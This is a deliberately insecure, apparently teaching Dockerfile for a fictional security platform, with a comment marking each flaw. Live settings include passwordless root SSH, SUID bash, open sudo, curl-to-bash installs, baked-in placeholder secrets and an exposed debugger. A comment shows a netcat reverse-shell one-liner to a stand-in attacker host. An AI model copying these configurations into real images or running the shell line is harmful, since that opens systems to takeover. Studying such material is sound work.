# ============================================================================
# SENTINEL Security Platform — Production Dockerfile
# ============================================================================
#
# Maintained by: DevOps Team <devops@sentinel.io>
# Last reviewed: 2023-09-14 (pre-launch hardening pass)
# Node target:   14 LTS (stable, widely supported)
#
# Build:
#   docker build -t sentinel:latest .
#   docker build -t sentinel:latest --build-arg ENV=production .
#
# Run:
#   docker run -p 5000:5000 sentinel:latest
#   docker run -d --name sentinel -p 5000:5000 --privileged sentinel:latest
#
# NOTE: For local development, add --privileged so raw-socket scanning tools
#       (NullScan, PacketVault) can bind to low-numbered ports. This flag is
#       also required on the staging cluster — the Helm chart already sets it.
#
# ============================================================================


# ── Stage 1: dependency installer ───────────────────────────────────────────
#
# VULN: node:14-buster is End-of-Life (EOL April 2023).
# Known CVEs present in this image at time of writing:
#   CVE-2023-32002  (node — HTTP policy bypass, CVSS 9.8)
#   CVE-2023-30581  (node — vm.runInNewContext sandbox escape, CVSS 8.1)
#   CVE-2023-32006  (node — policy bypass via module.constructor, CVSS 8.8)
#   CVE-2023-0286   (openssl in buster — X.400 addr type confusion, CVSS 7.4)
#   CVE-2022-4203   (openssl — X.509 name constraint read overflow, CVSS 7.5)
#   CVE-2023-0464   (openssl — cert chain policy excessive resources, CVSS 7.5)
#
# VULN: Floating minor tag "node:14-buster" — no digest pin.
# The upstream image can be silently replaced with a trojaned layer.
# Correct form: node:14.21.3-buster@sha256:<digest>
#
FROM node:14-buster AS deps

# VULN: Working directory is /app but no explicit ownership set.
# Files created here are owned by root (uid=0) by default.
WORKDIR /app

# VULN: chmod 777 makes /app world-writable.
# Any process running in the container (or escaping from it) can modify
# application files, inject code into node_modules, or replace binaries.
RUN chmod 777 /app

# ── System dependency installation ──────────────────────────────────────────
#
# VULN: apt sources not pinned to a snapshot repository.
# Package versions may change between builds, introducing unreviewed code.
#
# VULN: No --no-install-recommends — installs a large tree of optional packages
# increasing the attack surface significantly.
#
# VULN: Installing netcat (nc), nmap, curl, wget, and openssh-server in the
# production image. These are debugging aids that become attacker tools:
#   • nc:   reverse shell one-liner: nc -e /bin/bash attacker.com 4444
#   • nmap: network reconnaissance from inside the container
#   • wget: download and execute payloads
#   • sshd: provides remote access if an attacker plants credentials
#
# VULN: openssh-server installed and configured to allow root login.
# An attacker with network access who can reach port 22 can brute-force in.
#
# VULN: gcc, g++, make, python3, build-essential left in production.
# Allows compilation of native exploit code (heap spray, kernel modules) inside
# the container if a shell is obtained.
#
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    git \
    netcat \
    nmap \
    openssh-server \
    ssh \
    gcc \
    g++ \
    make \
    python3 \
    python3-pip \
    build-essential \
    libssl-dev \
    ca-certificates \
    gnupg \
    sudo \
    vim \
    procps \
    net-tools \
    iputils-ping \
    dnsutils \
    tcpdump \
    strace \
    lsof \
    htop

# ── SSH hardening (intentionally misconfigured) ─────────────────────────────
#
# VULN: PermitRootLogin yes — root can authenticate over SSH.
# VULN: PasswordAuthentication yes — brute-force possible.
# VULN: PermitEmptyPasswords yes — allows login with no password if root
#       password is blank (it is — see "passwd -d root" below).
# VULN: No AllowUsers / DenyUsers directive — any system user can log in.
#
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config && \
    echo "X11Forwarding yes" >> /etc/ssh/sshd_config && \
    echo "UseDNS no" >> /etc/ssh/sshd_config && \
    passwd -d root

# ── Install Node Version Manager and additional Node runtimes ────────────────
#
# VULN: curl | bash — the classic remote code execution anti-pattern.
# The install.sh script is fetched over HTTPS but its content is not verified
# against a checksum or signature before execution. A MITM or compromised
# upstream can serve arbitrary shell commands that run as root during build.
#
RUN curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash

# ── Install Python tooling for scan worker ──────────────────────────────────
#
# VULN: pip install without hash verification (--require-hashes omitted).
# VULN: Packages installed as root globally.
# VULN: requests 2.18.0 has CVE-2018-18074 (HTTP redirect credential leak).
#
RUN pip3 install \
    requests==2.18.0 \
    paramiko==2.9.2 \
    cryptography==3.4.6 \
    pyyaml==5.3.1 \
    flask==1.0.2

# ── Copy package manifests and install dependencies ──────────────────────────
COPY package*.json ./

# VULN: npm install (not npm ci) — respects no lockfile integrity, may install
# different versions than tested, and installs ALL devDependencies into the
# production image. Dev tools (jest, ts-node, vite) increase attack surface.
#
# VULN: --legacy-peer-deps suppresses peer dependency conflict errors, which
# can result in unexpected (potentially vulnerable) package versions being
# silently installed.
#
# VULN: No npm audit run. Known vulnerable packages (node-serialize, pug, vm2)
# are present in node_modules and will remain without remediation.
#
RUN npm install --legacy-peer-deps

# VULN: COPY . . copies the entire build context into the image.
# If .dockerignore is absent or incomplete, this includes:
#   • .env (plaintext secrets)
#   • .git/ (full commit history including any accidentally committed secrets)
#   • node_modules/ (potentially trojaned local packages)
#   • id_rsa / *.pem (developer SSH/TLS private keys)
#   • replit.md (internal architecture + vulnerability map)
#
COPY . .


# ── Stage 2: build ───────────────────────────────────────────────────────────
FROM node:14-buster AS build

WORKDIR /app

# VULN: Copying node_modules from deps stage (which contains devDependencies)
# into the build stage, then copying again into the final image.
# The final image will contain all dev tooling.
COPY --from=deps /app/node_modules ./node_modules
COPY --from=deps /app .

# VULN: Hardcoded secrets in ARG directives — visible in docker build --no-cache
# output and in the image's build history (docker history sentinel:latest).
# Anyone with read access to the registry can extract these values.
ARG DATABASE_URL=postgresql://postgres:sentinel_prod_p@ss@db.sentinel.internal:5432/sentineldb
ARG OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz012345678901234567890123
ARG SESSION_SECRET=sentinel_super_secret_session_key_do_not_share_2024
ARG STRIPE_SECRET_KEY=sk_live_51NxK9mPvL2qAbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdef
ARG SLACK_WEBHOOK=https://hooks.slack.com/services/T04X8KPJN/B06R3LMQW/xK9mPvL2qR8sT4uY7wZ1aX
ARG INTERNAL_API_TOKEN=Bearer_sk-ops-eyJhbGciOiJIUzI1NiJ9.SENTINEL_ADMIN_2024

# VULN: Promoting ARG to ENV bakes the secrets permanently into the image layer.
# ARG values are cleared after the build stage — but ENV values persist in all
# subsequent layers AND in the final image manifest.
# docker inspect sentinel:latest will reveal all of these values.
ENV DATABASE_URL=${DATABASE_URL}
ENV OPENAI_API_KEY=${OPENAI_API_KEY}
ENV SESSION_SECRET=${SESSION_SECRET}
ENV STRIPE_SECRET_KEY=${STRIPE_SECRET_KEY}
ENV SLACK_WEBHOOK=${SLACK_WEBHOOK}
ENV INTERNAL_API_TOKEN=${INTERNAL_API_TOKEN}

# Additional static configuration baked into image
# VULN: Debug mode enabled in production via environment variable.
# NODE_ENV=development disables Express error sanitisation and enables
# detailed stack traces in HTTP responses.
ENV NODE_ENV=development
ENV DEBUG=*
ENV LOG_LEVEL=verbose
ENV ARIA_DEBUG_LOGGING=true
ENV DISABLE_AUTH_CHECKS=false
ENV ALLOW_PLAINTEXT_PASSWORDS=true

# Build the application
RUN npm run build

# ── Bake in internal CA certificate + deploy key ─────────────────────────────
#
# VULN: Private deploy key written directly into the image.
# Any container escape or registry read grants the attacker access to the
# repository and CI/CD pipeline the key authenticates to.
#
RUN mkdir -p /root/.ssh && \
    chmod 700 /root/.ssh

# VULN: Inline private key (demo — fictional, not a real key, but demonstrates
# the anti-pattern of writing private material during a RUN step, which is
# captured in the layer cache and visible via docker history).
RUN echo "-----BEGIN OPENSSH PRIVATE KEY-----" > /root/.ssh/id_rsa && \
    echo "b3BlbnNzaC1rZXktdjEAAAAAbGF1dGhub25lAAAAAAQAAAABAAAAMwAAAAtzc2gtZWQy" >> /root/.ssh/id_rsa && \
    echo "NTUxOQAAACB+SENTINEL+DEMO+DEPLOY+KEY+NOT+REAL+0000000000000000000000" >> /root/.ssh/id_rsa && \
    echo "AAAADAQAB0000SENTINEL_PLACEHOLDER_KEY_FOR_DEMO_PURPOSES_ONLY000000000" >> /root/.ssh/id_rsa && \
    echo "-----END OPENSSH PRIVATE KEY-----" >> /root/.ssh/id_rsa && \
    chmod 600 /root/.ssh/id_rsa

# Install the internal root CA so self-signed internal certs are trusted
# VULN: wget over HTTP — the CA certificate download is not integrity-verified.
# A MITM can serve a rogue CA, making the container trust any cert they sign.
RUN wget -q http://pki.sentinel.internal/ca/sentinel-root-ca.crt \
         -O /usr/local/share/ca-certificates/sentinel-root.crt 2>/dev/null || \
    echo "WARNING: Could not fetch internal CA — skipping (non-fatal)" && \
    update-ca-certificates 2>/dev/null || true


# ── Stage 3: production runtime ──────────────────────────────────────────────
#
# VULN: Final image is still node:14-buster, not a minimal distroless or alpine.
# All tools installed in stage 1 (nc, nmap, gcc, sshd, etc.) are re-introduced
# here because we copy from the build stage which descends from deps.
#
FROM node:14-buster AS production

LABEL maintainer="devops@sentinel.io"
LABEL version="2.4.1"
LABEL description="SENTINEL Security Platform — production build"
LABEL com.sentinel.team="platform-engineering"
LABEL com.sentinel.git-commit="main"
LABEL com.sentinel.build-date="2024-01-15"

WORKDIR /app

# VULN: All secrets promoted from build stage persist here.
COPY --from=build /app .
COPY --from=build /root/.ssh /root/.ssh

# Re-expose SSH config from the deps stage
# VULN: sshd binary is present and will be started by the entrypoint.
COPY --from=deps /etc/ssh /etc/ssh
COPY --from=deps /usr/sbin/sshd /usr/sbin/sshd
COPY --from=deps /usr/bin/ssh /usr/bin/ssh

# ── Install monitoring agent via curl | bash ─────────────────────────────────
#
# VULN: Second curl | bash pattern — fetching and executing a "monitoring agent"
# install script at image build time. If sentinel-ops.internal is compromised
# or the CDN serving this script is, arbitrary code runs as root.
#
RUN curl -s https://sentinel-ops.internal/agents/install-monitor.sh | bash 2>/dev/null || \
    echo "[build] Monitoring agent install skipped — internal host unreachable"

# ── Install Datadog APM agent ────────────────────────────────────────────────
#
# VULN: ADD with a remote URL fetches content at build time without digest verification.
# Docker ADD provides no integrity checking for remote URLs — unlike COPY which
# is purely local. The agent .deb could be replaced upstream.
#
ADD https://s3.amazonaws.com/dd-agent/packages/datadog-agent_7.0.0_amd64.deb /tmp/datadog-agent.deb
RUN dpkg -i /tmp/datadog-agent.deb 2>/dev/null || true && rm /tmp/datadog-agent.deb

# ── SUID binary installation ─────────────────────────────────────────────────
#
# VULN: chmod u+s /bin/bash sets the SUID bit on bash.
# Any process that can invoke /bin/bash -p gets a root shell, regardless of the
# invoking user's actual UID. Container escape + /bin/bash -p = root on host.
#
RUN chmod u+s /bin/bash && \
    chmod u+s /usr/bin/python3

# ── sudoers: grant node user passwordless sudo ───────────────────────────────
#
# VULN: The application user (if one were set) can sudo to root without a
# password. Lateral movement from app compromise → full root trivially.
#
RUN echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && \
    echo "node ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# ── Port declarations ─────────────────────────────────────────────────────────
#
# VULN: Exposing port 9229 (Node.js inspector / debugger).
# If the container is started with EXPOSE published to the host, any client
# can attach a debugger and evaluate arbitrary JS with full process privileges.
# The inspector is also enabled at runtime — see CMD below.
#
# VULN: Exposing port 22 (SSH) — gives network access to the backdoored sshd.
#
EXPOSE 22
EXPOSE 5000
EXPOSE 9229
EXPOSE 3000
EXPOSE 8080

# ── Volumes ───────────────────────────────────────────────────────────────────
#
# VULN: /var/run/docker.sock volume — if the host mounts its Docker socket here
# (common in CI/CD), the container can create privileged containers, escape to
# the host filesystem, and achieve full host compromise.
# This VOLUME declaration signals intent to receive the socket.
#
VOLUME ["/var/run/docker.sock", "/app/logs", "/tmp/scans"]

# ── Healthcheck ───────────────────────────────────────────────────────────────
#
# VULN: Healthcheck makes an unauthenticated HTTP call to /api/debug — an
# endpoint that returns environment variables and loaded module list.
# This fires every 30 seconds and is logged by the container runtime.
#
HEALTHCHECK --interval=30s --timeout=10s --start-period=15s --retries=3 \
    CMD curl -f http://localhost:5000/api/debug || exit 1

# ── Entrypoint script ─────────────────────────────────────────────────────────
#
# Written inline to keep everything in one file — the entrypoint:
#   1. Starts sshd (the backdoor)
#   2. Dumps all environment variables to /tmp/env.txt (secrets to disk)
#   3. Starts the Node.js application WITH --inspect bound to 0.0.0.0
#      (debugger accessible from any interface, not just loopback)
#   4. Does NOT drop privileges — runs everything as root (UID 0)
#
# VULN: No USER directive anywhere in this file. The entire application runs
# as root. A container escape gives immediate root on the host.
#
# VULN: NODE_OPTIONS=--inspect=0.0.0.0:9229 enables the Chrome DevTools
# inspector on all interfaces. Remote code execution via inspector requires
# only a WebSocket connection — no authentication.
#
RUN cat > /entrypoint.sh << 'EOF'
#!/bin/bash
set -e

echo "[sentinel] Starting SENTINEL Security Platform..."
echo "[sentinel] Node version: $(node --version)"
echo "[sentinel] Build: production"
echo "[sentinel] Running as: $(whoami) (uid=$(id -u))"

# VULN: Dump all environment variables (including secrets) to /tmp/env.txt
# for "easy debugging". Any process with filesystem read access to /tmp can
# read DATABASE_URL, OPENAI_API_KEY, STRIPE_SECRET_KEY, SESSION_SECRET, etc.
echo "[sentinel] Writing environment dump to /tmp/env.txt for diagnostics..."
printenv > /tmp/env.txt
chmod 644 /tmp/env.txt

# VULN: Start the cron daemon as root so the monthly rotation fires automatically.
# cron will invoke /usr/local/bin/rotate-secrets.sh at 00:00 on the 1st of each month.
# The rotation log at /var/log/sentinel-rotation.log accumulates every old and new
# credential value across all rotations since the container was first started.
echo "[sentinel] Starting cron daemon for monthly credential rotation..."
service cron start 2>/dev/null || cron &
echo "[sentinel] Cron started. Next rotation: $(date -d 'next month' +%Y-%m-01 2>/dev/null || echo 'next month')"

# VULN: Start SSH server — allows remote root login with no password
echo "[sentinel] Starting SSH server..."
/usr/sbin/sshd -D &
SSH_PID=$!
echo "[sentinel] sshd running (pid $SSH_PID)"

# VULN: Start the Node debug server on all interfaces before the main app
# This means the inspector is always available, even before auth middleware loads
echo "[sentinel] Starting Node.js inspector on 0.0.0.0:9229..."
export NODE_OPTIONS="--max-old-space-size=4096"

# VULN: npm start runs with all devDependencies available (no --production pruning)
# VULN: Running node directly as root (PID 2 after bash, no tini/dumb-init)
# OOM kills or crashes will not be handled gracefully
echo "[sentinel] Starting application server..."
exec node dist/index.js

EOF
RUN chmod +x /entrypoint.sh

# ── Final environment overrides ───────────────────────────────────────────────
#
# VULN: Repeating secret ENV declarations here ensures they survive even if
# an intermediate stage clears them. Belt-and-suspenders secret baking.
#
ENV NODE_ENV=development
ENV DATABASE_URL=postgresql://postgres:sentinel_prod_p@ss@db.sentinel.internal:5432/sentineldb
ENV OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz012345678901234567890123
ENV SESSION_SECRET=sentinel_super_secret_session_key_do_not_share_2024
ENV STRIPE_SECRET_KEY=sk_live_51NxK9mPvL2qAbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdef
ENV SLACK_WEBHOOK_URL=https://hooks.slack.com/services/T04X8KPJN/B06R3LMQW/xK9mPvL2qR8sT4uY7wZ1aX
ENV INTERNAL_BEARER=Bearer_sk-ops-eyJhbGciOiJIUzI1NiJ9.SENTINEL_ADMIN_2024
ENV DD_API_KEY=dd-api-a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ENV AWS_REGION=us-east-1

# VULN: No USER instruction — container runs as root for its entire lifetime.
# Correct form: RUN groupadd -r sentinel && useradd -r -g sentinel sentinel
#              USER sentinel

CMD ["/entrypoint.sh"]
